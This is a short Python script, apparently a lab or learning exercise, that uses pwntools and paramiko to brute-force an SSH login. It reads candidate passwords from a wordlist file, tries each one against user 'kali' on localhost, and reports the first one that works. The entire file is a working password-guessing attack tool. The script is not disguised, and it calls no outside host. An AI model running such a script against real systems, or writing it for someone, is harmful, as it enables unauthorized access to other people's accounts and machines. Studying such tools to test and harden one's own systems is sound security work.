from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0

with open("passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            # Using pwnlib's ssh function, ensure timeout is appropriately set
            response = ssh(host=host, user=username, password=password, timeout=10)  # Increased timeout to 10 seconds
            
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        except paramiko.ssh_exception.SSHException as e:
            print(f"[!] SSHException: {e}")
        except Exception as e:
            print(f"[!] Unexpected Exception: {e}")
        attempts += 1
